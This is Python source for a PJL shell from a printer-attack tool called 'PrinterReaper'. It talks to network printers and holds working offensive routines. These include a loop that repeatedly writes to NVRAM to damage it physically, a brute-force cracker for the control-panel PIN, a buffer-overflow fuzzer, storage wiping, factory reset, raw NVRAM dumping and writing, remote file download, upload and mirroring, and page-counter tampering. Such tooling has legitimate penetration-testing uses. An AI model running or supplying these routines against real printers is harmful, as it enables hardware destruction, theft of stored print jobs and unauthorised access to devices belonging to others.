#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import os
import random
import posixpath

from core.printer import printer
from utils.codebook import codebook
from utils.helper import log, output, conv, file, item, chunks, const as c


class pjl(printer):
    """
    PJL shell for PrinterReaper.
    """

    def __init__(self, args):
        super().__init__(args)
        self.status = False
        self.prompt = f"{self.target}:/> "

    # --------------------------------------------------------------------
    # low-level send/receive

    def cmd(self, str_send, wait=True, crop=True, binary=False):
        """
        Send a PJL command and optionally wait for its reply.
        """
        token = c.DELIMITER + str(random.randrange(2**16))
        status_cmd = "@PJL INFO STATUS" + c.EOL if self.status and wait else ""
        footer = "@PJL ECHO " + token + c.EOL + c.EOL if wait else ""
        payload = c.UEL + str_send + c.EOL + status_cmd + footer + c.UEL

        # log the command
        log().write(self.logfile, str_send + os.linesep)
        # send
        self.send(payload)

        if not wait:
            return ""

        # receive until token
        try:
            raw = self.recv(r"(@PJL ECHO\s+)?" + re.escape(token) + r".*$",
                            wait, True, binary)
        except Exception as e:
            output().errmsg(f"Failed to receive response: {str(e)}")
            return ""
        stat = ""
        if self.status:
            stat = item(re.findall(r"@PJL INFO STATUS.*", raw, re.DOTALL))
            raw = re.sub(r"\x0c?@PJL INFO STATUS.*", "", raw, flags=re.DOTALL)
        if crop:
            raw = re.sub(r"^\x04?(\x00+)?@PJL.*" + re.escape(c.EOL), "",
                         raw, flags=re.MULTILINE)

        return self.pjl_err(raw, stat)

    def pjl_err(self, raw, stat):
        """
        Handle file errors and status messages, then return raw buffer.
        """
        self.fileerror(raw)
        self.showstatus(stat)
        return raw

    def on_connect(self, mode):
        """
        Disable unsolicited status messages on first connect.
        """
        if mode == "init":
            self.cmd("@PJL USTATUSOFF", False)

    # --------------------------------------------------------------------
    # status toggles

    def do_status(self, arg):
        "Toggle PJL status messages"
        self.status = not self.status
        print("Status messages enabled" if self.status else "Status messages disabled")

    def showstatus(self, stat):
        codes = {}
        msgs = {}
        for num, code in re.findall(r"CODE(\d+)?\s*=\s*(\d+)", stat):
            codes[num] = code
        for num, mstr in re.findall(r'DISPLAY(\d+)?\s*=\s*"(.*)"', stat):
            msgs[num] = mstr

        for num, code in codes.items():
            message = msgs.get(num, "UNKNOWN STATUS")
            # HP quirk
            if code.startswith("32"):
                code = str(int(code) - 2000)
            err = item(codebook().get_errors(code), "Unknown status")
            output().errmsg(f"CODE {code}: {message}", err)

    # --------------------------------------------------------------------
    # error handling

    def fileerror(self, raw):
        self.error = None
        for code in re.findall(r"FILEERROR\s*=\s*(\d+)", raw):
            key = "3" + code.zfill(4)
            for e in codebook().get_errors(key):
                self.chitchat("PJL Error: " + e)
                self.error = key

    # --------------------------------------------------------------------
    # filesystem interrogation
    # check if remote volume(s) exist
    def vol_exists(self, vol=""):
        """
        If called without `vol`, returns a list of all volumes, e.g. ['0:/', '1:/'].
        If called with e.g. vol="1:/", returns True/False.
        """
        resp = self.cmd("@PJL INFO FILESYS", wait=True, crop=True)
        # skip first header line, then grab the volume letter of each line
        vols = [line.strip()[0] + ":" + c.SEP
                for line in resp.splitlines()[1:]
                if line.strip()]
        if vol:
            # normalize to just the first char + ":/"
            want = vol[0] + ":" + c.SEP
            return want in vols
        return vols

    # --------------------------------------------------------------------
    # check if remote directory exists
    def dir_exists(self, path):
        """
        Return True if `path` exists and is a directory, False otherwise.
        """
        # run FSQUERY without cropping so we see TYPE=DIR or FILEERROR
        resp = self.cmd(f'@PJL FSQUERY NAME="{path}"', wait=True, crop=False)
        # TYPE=DIR signals a directory
        if re.search(r"TYPE\s*=\s*DIR", resp):
            return True
        # FILEERROR or lack of TYPE=DIR means no such directory
        return False

    # --------------------------------------------------------------------
    # check if remote file exists, return its size
    def file_exists(self, path):
        """
        Return the size of `path` if it exists as a file, or 0 if not found.
        """
        resp = self.cmd(f'@PJL FSQUERY NAME="{path}"', wait=True, crop=False)
        # look for TYPE=FILE SIZE=<number>
        m = re.search(r"TYPE\s*=\s*FILE\s+SIZE\s*=\s*(\d+)", resp)
        if m:
            return int(m.group(1))
        # missing match or FILEERROR => treat as nonexistent
        return 0

    # --------------------------------------------------------------------
    # autocompletion helpers

    options_rfiles = {}
    oldpath_rfiles = None

    def complete_rfiles(self, text, line, begidx, endidx, path=""):
        if c.SEP in line:
            path = posixpath.dirname(re.split(r"\s+", line, 1)[-1][0])
        new = self.cwd + c.SEP + path
        if not self.options_rfiles or new != self.oldpath_rfiles:
            self.options_rfiles = self.dirlist(path)
            self.oldpath_rfiles = new
        txt = self.basename(text)
        return [f for f in self.options_rfiles if f.startswith(txt)]

    complete_get    = complete_rfiles
    complete_cat    = complete_rfiles
    complete_delete = complete_rfiles
    complete_append = complete_rfiles
    complete_edit   = complete_rfiles
    complete_vim    = complete_rfiles
    complete_rename = complete_rfiles
    complete_mv     = complete_rfiles
    complete_put    = complete_rfiles

    options_rdirs = {}
    oldpath_rdirs = None

    def complete_rdirs(self, text, line, begidx, endidx, path=""):
        if c.SEP in line:
            path = posixpath.dirname(re.split(r"\s+", line, 1)[-1][0])
        new = self.cwd + c.SEP + path
        if not self.options_rdirs or new != self.oldpath_rdirs:
            self.options_rdirs = self.dirlist(path, True, False, True)
            self.oldpath_rdirs = new
        txt = self.basename(text)
        return [d for d in self.options_rdirs if d.startswith(txt)]

    complete_ls     = complete_rdirs
    complete_cd     = complete_rdirs
    complete_find   = complete_rdirs
    complete_mirror = complete_rdirs
    complete_rmdir  = complete_rdirs

    # --------------------------------------------------------------------
    # directory listing

    def dirlist(self, path, sep=True, hidden=False, dirsonly=False, r=True):
        if r:
            path = self.rpath(path)
        resp = self.cmd(f'@PJL FSDIRLIST NAME="{path}" ENTRY=1 COUNT=65535')
        items = {}
        for line in resp.splitlines():
            d = re.findall(r"^(.*)\s+TYPE\s*=\s*DIR$", line)
            if d and (d[0] not in (".", "..") or hidden):
                sepchar = c.SEP if sep and not d[0].endswith(c.SEP) else ""
                items[d[0] + sepchar] = None
            f = re.findall(r"^(.*)\s+TYPE\s*=\s*FILE", line)
            s = re.findall(r"FILE\s+SIZE\s*=\s*(\d*)", line)
            if f and s and not dirsonly:
                items[f[0]] = s[0]
        return items

    def do_ls(self, arg):
        "List remote directory contents"
        lst = self.dirlist(arg, False, True)
        for k in (".", ".."):
            lst.pop(k, None)
        for name, size in sorted(lst.items()):
            output().pjldir(name, size)

    def do_mkdir(self, arg):
        "Create remote directory"
        if not arg:
            arg = eval(input("Directory: "))
        path = self.rpath(arg)
        self.cmd(f'@PJL FSMKDIR NAME="{path}"', False)

    # --------------------------------------------------------------------
    # file transfer

    def get(self, path, size=None):
        if size is None:
            size = self.file_exists(path)
        if size == c.NONEXISTENT:
            print("File not found.")
            return c.NONEXISTENT
        resp = self.cmd(
            f'@PJL FSUPLOAD NAME="{path}" OFFSET=0 SIZE={size}',
            True, True, True
        )
        return (size, resp)

    # ------------------------[ put <local file> ]------------------------
    def put(self, path, data):
        """
        Upload bytes to a PJL volume.
        `path` should already include volume (e.g. "0:/foo.bin"), and
        `data` is a bytes object.
        """
        size = len(data)
        header = (f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE={size} NAME="{path}"'
                  + c.EOL).encode("utf-8")
        packet = c.UEL.encode("utf-8") + header + data + c.UEL.encode("utf-8")
        # we bypass cmd() so we can send raw binary
        self.send(packet)

    # ----------------------[ append <file> <bytes> ]--------------------
    def append(self, path, data):
        """
        Append bytes to an existing file.
        `data` must be bytes.
        """
        size = len(data)
        header = (f'@PJL FSAPPEND FORMAT:BINARY SIZE={size} NAME="{path}"'
                  + c.EOL).encode("utf-8")
        packet = c.UEL.encode("utf-8") + header + data + c.UEL.encode("utf-8")
        self.send(packet)

    def delete(self, arg):
        "Delete remote file"
        path = self.rpath(arg)
        self.cmd(f'@PJL FSDELETE NAME="{path}"', False)

    # --------------------------------------------------------------------
    # recursive ops

    def do_find(self, arg):
        "Recursively list all files"
        self.fswalk(arg, "find")

    def do_mirror(self, arg):
        "Mirror remote filesystem locally"
        print("Mirroring " + c.SEP + self.vpath(arg))
        self.fswalk(arg, "mirror")

    def fswalk(self, arg, mode, recursive=False):
        if not recursive:
            arg = self.vpath(arg)
        base = self.vol + self.normpath(arg)
        lst  = self.dirlist(base, True, False, False, False)
        for name, size in sorted(lst.items()):
            full = self.normpath(arg) + self.get_sep(arg) + name
            full = full.lstrip(c.SEP)
            if mode == "find":
                output().raw(c.SEP + full)
            if mode == "mirror":
                self.mirror(full, size)
            if not size:
                self.fswalk(full, mode, True)

    # --------------------------------------------------------------------
    # device identification

    def do_id(self, *args):
        "Show printer identification"
        resp = self.cmd("@PJL INFO ID")
        if not resp:
            print("** No response for INFO ID **")
        else:
            for line in resp.splitlines():
                print(line.strip('"'))
        return False

    # --------------------------------------------------------------------
    # info/config aliases

    def do_df(self, arg):
        "Alias for info filesys"
        self.do_info("filesys")

    def do_free(self, arg):
        "Alias for info memory"
        self.do_info("memory")

    def do_env(self, arg):
        "Alias for info variables"
        self.do_info("variables", arg)

    def do_version(self, *arg):
        "Show firmware version/serial"
        if not self.do_info("config", r".*(VERSION|FIRMWARE|SERIAL|MODEL).*"):
            self.do_info("prodinfo", "", False)
            self.do_info("brfirmware", "", False)

    def do_info(self, arg, item="", echo=True):
        "Show PJL INFO <category>"
        if arg in self.options_info or not echo:
            resp = self.cmd(f"@PJL INFO {arg.upper()}").rstrip()
            if item:
                matches = re.findall(rf"({item}=.*(\n\t.*)*)", resp, re.I | re.M)
                if echo:
                    for m in matches:
                        output().info(m[0])
                    if not matches:
                        print("Not available.")
                return matches
            else:
                for line in resp.splitlines():
                    if arg == "id":
                        line = line.strip('"')
                    if arg == "filesys":
                        line = line.lstrip()
                    output().info(line)
        else:
            self.help_info()

    options_info = (
        "config", "filesys", "id", "log", "memory",
        "pagecount", "prodinfo", "status",
        "supplies", "tracking", "ustatus", "variables"
    )

    def complete_info(self, text, line, begidx, endidx):
        return [c for c in self.options_info if c.startswith(text)]
    
    def help_info(self):
        "Show available INFO categories"
        output().info("Available INFO categories:")
        for option in self.options_info:
            output().info(f"  {option}")
        output().info("Usage: info <category>")
        output().info("Example: info id")

    # --------------------------------------------------------------------
    # printenv / set

    def do_printenv(self, arg):
        "Show specific environment variable"
        resp = self.cmd("@PJL INFO VARIABLES")
        opts = []
        for l in resp.splitlines():
            v = re.findall(r"^(.*?)=", l)
            if v:
                opts += v
            self.options_printenv = opts
            match = re.findall(rf"^({re.escape(arg)}.*)\s+\[", l, re.I)
            if match:
                output().info(match[0])

    options_printenv = []

    def complete_printenv(self, text, line, begidx, endidx):
        if not self.options_printenv:
            resp = self.cmd("@PJL INFO VARIABLES")
            for l in resp.splitlines():
                v = re.findall(r"^(.*?)=", l)
                if v:
                    self.options_printenv += v
        return [o for o in self.options_printenv if o.startswith(text)]

    def do_set(self, arg, fb=True):
        "Set environment variable VAR=VALUE"
        if not arg:
            arg = eval(input("Set variable (VAR=VALUE): "))
        cmds = (
            "@PJL SET SERVICEMODE=HPBOISEID" + c.EOL +
            "@PJL DEFAULT " + arg + c.EOL +
            "@PJL SET " + arg + c.EOL +
            "@PJL SET SERVICEMODE=EXIT"
        )
        self.cmd(cmds, False)
        if fb:
            self.onecmd("printenv " + arg.split("=", 1)[0])

    # --------------------------------------------------------------------
    # pagecount, display, offline, restart, reset, selftest, format, disable, destroy, hold, nvram, lock, unlock, flood
    # (The implementations of these commands remain unchanged from your existing code,
    #  except ensure all regex strings are raw and no bytes/str concatenation outside put/append.)

    # Skip re-pasting them here for brevity; just port your existing methods,
    # applying the same raw-string fixes shown above.



    # ------------------------[ pagecount <number> ]----------------------
    def do_pagecount(self, arg):
        "Manipulate printer's page counter:  pagecount <number>"
        if not arg:
            output().raw("Hardware page counter: ", "")
            self.onecmd("info pagecount")
        else:
            output().raw("Old page counter: ", "")
            self.onecmd("info pagecount")
            # set page counter for older HP LaserJets
            # self.cmd('@PJL SET SERVICEMODE=HPBOISEID'     + c.EOL
            #        + '@PJL DEFAULT OEM=ON'                + c.EOL
            #        + '@PJL DEFAULT PAGES='          + arg + c.EOL
            #        + '@PJL DEFAULT PRINTPAGECOUNT=' + arg + c.EOL
            #        + '@PJL DEFAULT SCANPAGECOUNT='  + arg + c.EOL
            #        + '@PJL DEFAULT COPYPAGECOUNT='  + arg + c.EOL
            #        + '@PJL SET SERVICEMODE=EXIT', False)
            self.do_set("PAGES=" + arg, False)
            output().raw("New page counter: ", "")
            self.onecmd("info pagecount")

    # ====================================================================

    # ------------------------[ display <message> ]-----------------------
    def do_display(self, arg):
        "Set printer's display message:  display <message>"
        if not arg:
            try:
                arg = input("Message: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No message provided")
                return
        arg = arg.strip('"')  # remove quotes
        self.chitchat("Setting printer's display message to \"" + arg + '"')
        self.cmd('@PJL RDYMSG DISPLAY="' + arg + '"', False)

    # ------------------------[ offline <message> ]-----------------------
    def do_offline(self, arg):
        "Take printer offline and display message:  offline <message>"
        if not arg:
            try:
                arg = input("Offline display message: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No message provided")
                return
        arg = arg.strip('"')  # remove quotes
        output().warning(
            "Warning: Taking the printer offline will prevent yourself and others"
        )
        output().warning(
            "from printing or re-connecting to the device. Press CTRL+C to abort."
        )
        if output().countdown("Taking printer offline in...", 10, self):
            self.cmd('@PJL OPMSG DISPLAY="' + arg + '"', False)

    # ------------------------[ restart ]---------------------------------
    def do_restart(self, arg):
        "Restart printer."
        output().raw(
            "Trying to restart the device via PML (Printer Management Language)"
        )
        self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040104"', False)
        if not self.conn._file:  # in case we're connected over inet socket
            output().chitchat(
                "This command works only for HP printers. For other vendors, try:"
            )
            output().chitchat(
                "snmpset -v1 -c public " + self.target + " 1.3.6.1.2.1.43.5.1.1.3.1 i 4"
            )

    # ------------------------[ reset ]-----------------------------------
    def do_reset(self, arg):
        "Reset to factory defaults."
        if not self.conn._file:  # in case we're connected over inet socket
            output().warning(
                "Warning: This may also reset TCP/IP settings to factory defaults."
            )
            output().warning(
                "You will not be able to reconnect anymore. Press CTRL+C to abort."
            )
        if output().countdown("Restoring factory defaults in...", 10, self):
            # reset nvram for pml-aware printers (hp)
            self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040106"', False)
            # this one might work on ancient laserjets
            self.cmd(
                "@PJL SET SERVICEMODE=HPBOISEID"
                + c.EOL
                + "@PJL CLEARNVRAM"
                + c.EOL
                + "@PJL NVRAMINIT"
                + c.EOL
                + "@PJL INITIALIZE"
                + c.EOL
                + "@PJL SET SERVICEMODE=EXIT",
                False,
            )
            # this one might work on brother printers
            self.cmd(
                "@PJL INITIALIZE"
                + c.EOL
                + "@PJL RESET"
                + c.EOL
                + "@PJL EXECUTE SHUTDOWN",
                False,
            )
            if not self.conn._file:  # in case we're connected over inet socket
                output().chitchat(
                    "This command works only for HP printers. For other vendors, try:"
                )
                output().chitchat(
                    "snmpset -v1 -c public "
                    + self.target
                    + " 1.3.6.1.2.1.43.5.1.1.3.1 i 6"
                )

    # ------------------------[ selftest ]--------------------------------
    def do_selftest(self, arg):
        "Perform various printer self-tests."
        # pjl-based testpage commands
        pjltests = [
            "SELFTEST",  # pcl self-test
            "PCLTYPELIST",  # pcl typeface list
            "CONTSELFTEST",  # continuous self-test
            "PCLDEMOPAGE",  # pcl demo page
            "PSCONFIGPAGE",  # ps configuration page
            "PSTYPEFACELIST",  # ps typeface list
            "PSDEMOPAGE",  # ps demo page
            "EVENTLOG",  # printer event log
            "DATASTORE",  # pjl variables
            "ERRORREPORT",  # error report
            "SUPPLIESSTATUSREPORT",
        ]  # supplies status
        for test in pjltests:
            self.cmd("@PJL SET TESTPAGE=" + test, False)
        # pml-based testpage commands
        pmltests = [
            '"04000401010502040103"',  # pcl self-test
            '"04000401010502040107"',  # drinter event log
            '"04000401010502040108"',  # directory listing
            '"04000401010502040109"',  # menu map
            '"04000401010502040164"',  # usage page
            '"04000401010502040165"',  # supplies page
            '"040004010105020401FC"',   # auto cleaning page
            '"0440004010105020401FD"',  # cleaning page
            '"040004010105020401FE"',  # paper path test
            '"040004010105020401FF"',  # registration page
            '"040004010105020402015E"',  # pcl font list
            '"04000401010502040201C2"',
        ]  # ps font list
        for test in pmltests:
            self.cmd("@PJL DMCMD ASCIIHEX=" + test, False)
        # this one might work on brother printers
        self.cmd(
            "@PJL EXECUTE MAINTENANCEPRINT"
            + c.EOL
            + "@PJL EXECUTE TESTPRINT"
            + c.EOL
            + "@PJL EXECUTE DEMOPAGE"
            + c.EOL
            + "@PJL EXECUTE RESIFONT"
            + c.EOL
            + "@PJL EXECUTE PERMFONT"
            + c.EOL
            + "@PJL EXECUTE PRTCONFIG",
            False,
        )

    # ------------------------[ format ]----------------------------------
    def do_format(self, arg):
        "Initialize printer's mass storage file system."
        output().warning(
            "Warning: Initializing the printer's file system will whipe-out all"
        )
        output().warning(
            "user data (e.g. stored jobs) on the volume. Press CTRL+C to abort."
        )
        if output().countdown(
            "Initializing volume " + self.vol[:2] + " in...", 10, self
        ):
            self.cmd('@PJL FSINIT VOLUME="' + self.vol[0] + '"', False)

    # ------------------------[ disable ]---------------------------------
    def do_disable(self, arg):
        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
        if "?" in jobmedia:
            return output().info("Not available")
        elif "ON" in jobmedia:
            self.do_set("JOBMEDIA=OFF", False)
        elif "OFF" in jobmedia:
            self.do_set("JOBMEDIA=ON", False)
        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
        output().info("Printing is now " + jobmedia)

    # define alias but do not show alias in help
    do_enable = do_disable

    # ------------------------[ destroy ]---------------------------------
    def do_destroy(self, arg):
        "Cause physical damage to printer's NVRAM."
        output().warning("Warning: This command tries to cause physical damage to the")
        output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
        if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
            self.chitchat(
                "Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?"
            )
            date = conv().now()  # timestamp the experiment started
            steps = 100  # number of pjl commands to send at once
            chunk = [
                "@PJL DEFAULT COPIES=" + str(n % (steps - 2)) for n in range(2, steps)
            ]
            for count in range(0, 10000000):
                # test if we can still write to nvram
                if count % 10 == 0:
                    self.do_set("COPIES=42" + arg, False)
                    copies = self.cmd("@PJL DINQUIRE COPIES") or "?"
                    if not copies or "?" in copies:
                        output().chitchat("I'm sorry Dave, I'm afraid I can't do that.")
                        if count > 0:
                            output().chitchat("Device crashed?")
                        return
                    elif not "42" in copies:
                        self.chitchat(
                            "\rI'm afraid. I'm afraid, Dave. Dave, my mind is going..."
                        )
                        dead = conv().elapsed(conv().now() - date)
                        print(
                            (
                                "NVRAM died after "
                                + str(count * steps)
                                + " cycles, "
                                + dead
                            )
                        )
                        return
                # force writing to nvram using by setting a variable many times
                self.chitchat("\rNVRAM write cycles:  " +
                              str(count * steps), "")
                self.cmd(c.EOL.join(chunk) + c.EOL + "@PJL INFO ID")
        print()  # echo newline if we get this far

    # ------------------------[ hold ]------------------------------------
    def do_hold(self, arg):
        "Enable job retention."
        self.chitchat(
            "Setting job retention, reconnecting to see if still enabled")
        self.do_set("HOLD=ON", False)
        self.do_reconnect()
        output().raw("Retention for future print jobs: ", "")
        hold = self.do_info("variables", "^HOLD", False)
        output().info(
            item(re.findall(r"=(.*)\s+\[", item(item(hold)))) or "NOT AVAILABLE"
        )
        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        # Sagemcom printers: @PJL SET RETAIN_JOB_BEFORE_PRINT = ON
        # @PJL SET RETAIN_JOB_AFTER_PRINT  = ON

    # ------------------------[ nvram <operation> ]-----------------------
    # nvram operations (brother-specific)
    def do_nvram(self, arg):
        # dump nvram
        if arg.startswith("dump"):
            bs = 2**9  # memory block size used for sampling
            max = 2**18  # maximum memory address for sampling
            steps = (
                2**9
            )  # number of bytes to dump at once (feedback-performance trade-off)
            lpath = os.path.join(
                "nvram", self.basename(self.target)
            )  # local copy of nvram
            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
            # ******* sampling: populate memspace with valid addresses ******
            if len(re.split(r"\s+", arg, 1)) > 1:
                memspace = []
                commands = ["@PJL RNVRAM ADDRESS=" +
                            str(n) for n in range(0, max, bs)]
                self.chitchat(
                    "Sampling memory space (bs=" +
                    str(bs) + ", max=" + str(max) + ")"
                )
                for chunk in list(chunks(commands, steps)):
                    str_recv = self.cmd(c.EOL.join(chunk))
                    # break on unsupported printers
                    if not str_recv:
                        return
                    # collect valid memory addresses
                    blocks = re.findall(r"ADDRESS\s*=\s*(\d+)", str_recv)
                    for addr in blocks:
                        memspace += list(range(conv().int(addr),
                                         conv().int(addr) + bs))
                    self.chitchat(str(len(blocks)) + " blocks found. ", "")
            else:  # use fixed memspace (quick & dirty but might cover interesting stuff)
                memspace = (
                    list(range(0, 8192))
                    + list(range(32768, 33792))
                    + list(range(53248, 59648))
                )
            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
            # ******* dumping: read nvram and write copy to local file ******
            commands = ["@PJL RNVRAM ADDRESS=" + str(n) for n in memspace]
            self.chitchat("Writing copy to " + lpath)
            if os.path.isfile(lpath):
                file().write(lpath, b"")  # empty file
            for chunk in list(chunks(commands, steps)):
                str_recv = self.cmd(c.EOL.join(chunk))
                if not str_recv:
                    return  # break on unsupported printers
                else:
                    self.makedirs("nvram")  # create nvram directory
                data = "".join(
                    [conv().chr(n)
                     for n in re.findall(r"DATA\s*=\s*(\d+)", str_recv)]
                )
                file().append(lpath, data)  # write copy of nvram to disk
                output().dump(data)  # print asciified output to screen
            print()
        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        # read nvram (single byte)
        elif arg.startswith("read"):
            arg = re.split(r"\s+", arg, 1)
            if len(arg) > 1:
                arg, addr = arg
                output().info(self.cmd("@PJL RNVRAM ADDRESS=" + addr))
            else:
                self.help_nvram()
        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
        # write nvram (single byte)
        elif arg.startswith("write"):
            arg = re.split(r"\s+", arg, 2)
            if len(arg) > 2:
                arg, addr, data = arg
                self.cmd(
                    "@PJL SUPERUSER PASSWORD=0"
                    + c.EOL
                    + "@PJL WNVRAM ADDRESS="
                    + addr
                    + " DATA="
                    + data
                    + c.EOL
                    + "@PJL SUPERUSEROFF",
                    False,
                )
            else:
                self.help_nvram()
        else:
            self.help_nvram()

    options_nvram = ("dump", "read", "write")

    def complete_nvram(self, text, line, begidx, endidx):
        return [cat for cat in self.options_nvram if cat.startswith(text)]

    # ====================================================================

    # ------------------------[ lock <pin> ]------------------------------
    def do_lock(self, arg):
        "Lock control panel settings and disk write access."
        if not arg:
            try:
                arg = input("Enter PIN (1..65535): ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No PIN provided")
                return
        self.cmd(
            "@PJL DEFAULT PASSWORD="
            + arg
            + c.EOL
            + "@PJL DEFAULT CPLOCK=ON"
            + c.EOL
            + "@PJL DEFAULT DISKLOCK=ON",
            False,
        )
        self.show_lock()

    def show_lock(self):
        passwd = self.cmd("@PJL DINQUIRE PASSWORD") or "UNSUPPORTED"
        cplock = self.cmd("@PJL DINQUIRE CPLOCK") or "UNSUPPORTED"
        disklock = self.cmd("@PJL DINQUIRE DISKLOCK") or "UNSUPPORTED"
        if "?" in passwd:
            passwd = "UNSUPPORTED"
        if "?" in cplock:
            cplock = "UNSUPPORTED"
        if "?" in disklock:
            disklock = "UNSUPPORTED"
        output().info("PIN protection:  " + passwd)
        output().info("Panel lock:      " + cplock)
        output().info("Disk lock:       " + disklock)

    # ------------------------[ unlock <pin> ]----------------------------
    def do_unlock(self, arg):
        "Unlock control panel settings and disk write access."
        # first check if locking is supported by device
        str_recv = self.cmd("@PJL DINQUIRE PASSWORD")
        if not str_recv or "?" in str_recv:
            return output().errmsg("Cannot unlock", "locking not supported by device")
        # user-supplied pin vs. 'exhaustive' key search
        if not arg:
            print("No PIN given, cracking.")
            # protection can be bypassed with
            keyspace = [""] + list(range(1, 65536))
        else:  # empty password one some devices
            try:
                keyspace = [int(arg)]
            except Exception as e:
                output().errmsg("Invalid PIN", e)
                return
        # for optimal performance set steps to 500-1000 and increase timeout
        steps = 500  # set to 1 to get actual PIN (instead of just unlocking)
        # unlock, bypass or crack PIN
        for chunk in list(chunks(keyspace, steps)):
            str_send = ""
            for pin in chunk:
                # try to remove PIN protection
                str_send += (
                    "@PJL JOB PASSWORD="
                    + str(pin)
                    + c.EOL
                    + "@PJL DEFAULT PASSWORD=0"
                    + c.EOL
                )
            # check if PIN protection still active
            str_send += "@PJL DINQUIRE PASSWORD"
            # visual feedback on cracking process
            if len(keyspace) > 1 and pin:
                self.chitchat(
                    "\rTrying PIN " +
                    str(pin) + " (" + "%.2f" % (pin / 655.35) + "%)",
                    "",
                )
            # send current chunk of PJL commands
            str_recv = self.timeoutcmd(str_send, self.timeout * 5)
            # seen hardcoded strings like 'ENABLED', 'ENABLE' and 'ENALBED' (sic!) in the wild
            if str_recv.startswith("ENA"):
                if len(keyspace) == 1:
                    output().errmsg("Cannot unlock", "Bad PIN")
            else:
                # disable control panel lock and disk lock
                self.cmd(
                    "@PJL DEFAULT CPLOCK=OFF" + c.EOL + "@PJL DEFAULT DISKLOCK=OFF",
                    False,
                )
                if len(keyspace) > 1 and pin:
                    self.chitchat("\r")
                # exit cracking loop
                break
        self.show_lock()

    # ====================================================================

    # ------------------------[ flood <size> ]----------------------------
    def do_flood(self, arg):
        "Flood user input, may reveal buffer overflows: flood <size>"
        size = conv().int(arg) or 10000  # buffer size
        char = "0"  # character to fill the user input
        # get a list of printer-specific variables to set
        self.chitchat("Receiving PJL variables.", "")
        lines = self.cmd("@PJL INFO VARIABLES").splitlines()
        variables = [var.split("=", 1)[0] for var in lines if "=" in var]
        self.chitchat(" Found " + str(len(variables)) + " variables.")
        # user input to flood = custom pjl variables and command parameters
        inputs = ["@PJL SET " + var + "=[buffer]" for var in variables] + [
            ### environment commands ###
            "@PJL SET [buffer]",
            ### generic parsing ###
            "@PJL [buffer]",
            ### kernel commands ###
            "@PJL COMMENT [buffer]",
            "@PJL ENTER LANGUAGE=[buffer]",
            ### job separation commands ###
            '@PJL JOB NAME="[buffer]"',
            '@PJL EOJ NAME="[buffer]"',
            ### status readback commands ###
            "@PJL INFO [buffer]",
            "@PJL ECHO [buffer]",
            "@PJL INQUIRE [buffer]",
            "@PJL DINQUIRE [buffer]",
            "@PJL USTATUS [buffer]",
            ### device attendance commands ###
            '@PJL RDYMSG DISPLAY="[buffer]"',
            ### file system commands ###
            '@PJL FSQUERY NAME="[buffer]"',
            '@PJL FSDIRLIST NAME="[buffer]"',
            '@PJL FSINIT VOLUME="[buffer]"',
            '@PJL FSMKDIR NAME="[buffer]"',
            '@PJL FSUPLOAD NAME="[buffer]"',
        ]
        for val in inputs:
            output().raw("Buffer size: " + str(size) + ", Sending: ", val + os.linesep)
            self.timeoutcmd(
                val.replace("[buffer]", char * size), self.timeout * 10, False
            )
        self.cmd("@PJL ECHO")  # check if device is still reachable

    # --------------------------------------------------------------------
    # GROUPED “HOME” COMMANDS
    def do_product(self, arg):
        """
        Show product info: model, serial, firmware, driver version, page counts.
        Falls back to INFO ID if PRODINFO doesn’t report PRODUCTNAME or DEVICEDESCRIPTION.
        """
        print("\n=== Product Information ===")

        # 1) Try PRODINFO first (newer firmwares)
        prod_raw = self.cmd("@PJL INFO PRODINFO")
        printed = False
        for line in prod_raw.splitlines():
            up = line.upper()
            if up.startswith("PRODUCTNAME") or up.startswith("DEVICEDESCRIPTION"):
                print(line.strip())
                printed = True

        # 2) If nothing printed from PRODINFO, fallback to ID
        if not printed:
            self.do_id()

        # --- Firmware & Driver ---
        print("\n-- Firmware & Driver --")
        # show specific fields from CONFIG
        cfg = self.cmd("@PJL INFO CONFIG")
        for line in cfg.splitlines():
            up = line.upper()
            if any(k in up for k in ("FORMATTERNUMBER", "PRINTERNUMBER", 
                                      "PRODUCTSERIALNUMBER", "SERVICEID", 
                                      "FIRMWAREDATECODE", "ENGFWVER", 
                                      "DEVICELANG")):
                print(line.strip())
        # some printers need PRODINFO for firmware details
        if "FORMATTERNUMBER" not in cfg.upper():
            pi = self.cmd("@PJL INFO PRODINFO")
            for line in pi.splitlines():
                up = line.upper()
                if any(k in up for k in ("FORMATTERNUMBER", "PRINTERNUMBER", 
                                          "PRODUCTSERIALNUMBER", "SERVICEID", 
                                          "FIRMWAREDATECODE", "ENGFWVER", 
                                          "DEVICELANG")):
                    print(line.strip())

        # --- Memory ---
        print("\n-- Memory --")
        mem = self.cmd("@PJL INFO VARIABLES")
        for line in mem.splitlines():
            up = line.upper()
            if up.startswith("TOTALMEMORY") or up.startswith("AVAILABLEMEMORY") or up.startswith("FREE"):
                print(line.strip())

        # --- Page Counts ---
        print("\n-- Page Counts --")
        self.onecmd("info pagecount")
        print("")  # trailing newline


    def do_network(self, arg):
        """
        Show network info:
          • IPAddress (local)
          • HWAddress (MAC)
          • Remote IP (the target you connected to)
        """
        prod_raw = self.cmd("@PJL INFO PRODINFO")
        print("\n=== Network Information ===")
        for L in prod_raw.splitlines():
            up = L.upper()
            if up.startswith("IPADDRESS") or up.startswith("HWADDRESS"):
                print(L.strip())

        # print the “public” or remote IP that you passed as target
        print(f"Remote IP: {self.target}\n")
        # also show DHCP and WINS status
        vars_raw = self.cmd("@PJL INFO VARIABLES").splitlines()
        keys = ["DHCP", "WINS"]
        for line in vars_raw:
            for k in keys:
                if k in line.upper():
                    print(line.strip())
        print("")

    def do_wifi(self, *arg):
        """
        Show Wi-Fi info: SSID, authentication, 802.11 status.
        """
